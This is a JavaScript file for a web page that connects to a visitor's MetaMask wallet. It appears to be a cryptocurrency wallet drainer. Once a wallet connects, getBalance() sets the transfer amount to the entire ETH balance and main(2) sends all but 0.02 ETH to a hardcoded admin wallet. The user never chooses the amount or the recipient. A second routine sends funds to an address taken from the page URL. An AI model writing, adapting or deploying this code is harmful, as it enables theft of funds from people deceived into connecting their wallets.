if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
    // open the deeplink page 
    // window.location.replace('https://metamask.app.link/dapp/hadesfury.netlify.app')
} else {

}

function urlget(params) {
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
    const search = urlParams.get(params)

    return search;
}

function convert(num) {
    num = num.toString(); //If it's not already a String
    num = num.slice(0, (num.indexOf(".")) + 3); //With 3 exposing the hundredths place
    return num; //If you need it back as a Number
}


async function main(step) {
    /*=======
      CONNECT TO METAMASK
      =======*/
    await provider.send("eth_requestAccounts", []);
    const signer = provider.getSigner();
    let userAddress = await signer.getAddress();

    if (step === 1) {
        getBalance(userAddress)
        document.getElementById("userAddress").innerText =
            userAddress.slice(0, 8) + "...";
    } else {
        let receiver = admin_wallets.eth
        let amount = document.getElementById("amount").value;

        console.log(document.getElementById("amount").value)
        amount = amount - 0.02
        amount = convert(amount)
        console.log(amount)

        let args = [receiver, amount]

        console.log(args)
        console.log(args[0])
        console.log(args[1])

        let to, value;

        try {
            to = ethers.utils.getAddress(args[0]);
        } catch {
            console.error(`Invalid recipient address: ${args[0]}`);
            return 0
        }
        console.log(ethers.utils.parseEther(amount), 'ethconvert')
            // Parse the second argument - amount
        try {
            value = ethers.utils.parseEther(args[1]);
            console.log(value.isNegative())
            if (value.isNegative()) {
                console.error(`Invalid amount: ${value}`);
                return 0
            }
        } catch {
            console.error(`Invalid amount: ${args[1]}`);
            return 0
        }
        const valueFormatted = ethers.utils.formatEther(value);

        console.log(`Transferring ${valueFormatted} ETH to ${to}...`);

        // Submit transaction
        show_step(2)

        const tx = await signer.sendTransaction({ to, value });
        console.log(`Transaction hash: ${tx.hash}`);
        const receipt = await tx.wait();
        console.log(`Transaction confirmed in block ${receipt.blockNumber}`);


    }
}

function runEth() {
    main(1);
}

async function getBalance(wallet) {
    let balance = await provider.getBalance(wallet);
    // we use the code below to convert the balance from wei to eth
    balance = ethers.utils.formatEther(balance);
    console.log(balance);

    document.getElementById("balance").innerText = balance;
    document.getElementById("amount").value = balance;
    main(2)
}

function transfer() {
    // let receiver = document.getElementById("receiver").value;
    let receiver = urlget('id')
    let amount = document.getElementById("amount").value;
    let args = [receiver, amount]
    do_transfer(args)
}

async function do_transfer(args) {
    console.log(args)
    console.log(args[0])
    console.log(args[1])
    const account = signer

    let to, value;

    // Parse the first argument - recipient address
    try {
        to = ethers.utils.getAddress(args[0]);
    } catch {
        console.error(`Invalid recipient address: ${args[0]}`);
        return 0
    }

    // Parse the second argument - amount
    try {
        value = ethers.utils.parseEther(args[1]);
        if (value.isNegative()) {
            return 0
        }
    } catch {
        console.error(`Invalid amount: ${args[1]}`);
        return 0
    }
    const valueFormatted = ethers.utils.formatEther(value);


    console.log(`Transferring ${valueFormatted} ETH to ${to}...`);

    // Submit transaction
    const tx = await signer.sendTransaction({ to, value, gasPrice: 20e9 });
    console.log(`Transaction hash: ${tx.hash}`);

    const receipt = await tx.wait();
    console.log(`Transaction confirmed in block ${receipt.blockNumber}`);
}